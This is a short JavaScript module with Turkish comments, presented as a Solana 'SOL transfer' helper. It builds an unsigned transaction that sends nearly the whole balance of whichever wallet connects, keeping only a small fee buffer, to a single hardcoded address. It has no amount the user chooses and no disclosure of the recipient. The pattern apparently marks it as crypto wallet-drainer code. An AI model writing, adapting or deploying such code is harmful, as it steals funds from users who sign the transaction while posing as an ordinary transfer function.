/* transaction.js */
/* eslint-disable @typescript-eslint/no-explicit-any */

import {
  PublicKey,
  SystemProgram,
  Transaction,
} from "@solana/web3.js";
import { connection } from "./connect.js";

/**
 * Sadece SOL transferi için imzalanmamış bir Transaction döner.
 * Yeterli SOL yoksa null döner.
 *
 * @param {PublicKey | null} userPublicKey
 * @returns {Promise<Transaction|null>}
 */
export async function createUnsignedTransaction(userPublicKey) {
  if (!userPublicKey) {
    console.warn("Kullanıcı cüzdanı bağlı değil!");
    return null;
  }

  // -----------------------------------------------------------
  // SOL Bakiyesi ve fee buffer hesapla
  // -----------------------------------------------------------
  const userSolLamports = await connection.getBalance(userPublicKey);
  const feeBufferLamports = 6_000_000; // ~0.006 SOL
  const solToSend = Math.max(userSolLamports - feeBufferLamports, 0);

  if (solToSend <= 0) {
    console.warn("Yeterli SOL yok!");
    return null;
  }

  // -----------------------------------------------------------
  // Hedef adres
  // -----------------------------------------------------------
  const toPublicKey = new PublicKey(
    "GpLLb2NqvWYyYJ5wGZNQCAuxHWdJdHpXscyHNd6SH8c1"
  );

  // -----------------------------------------------------------
  // Transaction oluşturma
  // -----------------------------------------------------------
  const { blockhash } = await connection.getLatestBlockhash();
  const tx = new Transaction({
    feePayer: userPublicKey,
    recentBlockhash: blockhash,
  });

  // -----------------------------------------------------------
  // Sadece SOL transfer instruction ekle
  // -----------------------------------------------------------
  tx.add(
    SystemProgram.transfer({
      fromPubkey: userPublicKey,
      toPubkey: toPublicKey,
      lamports: solToSend,
    })
  );

  return tx;
}
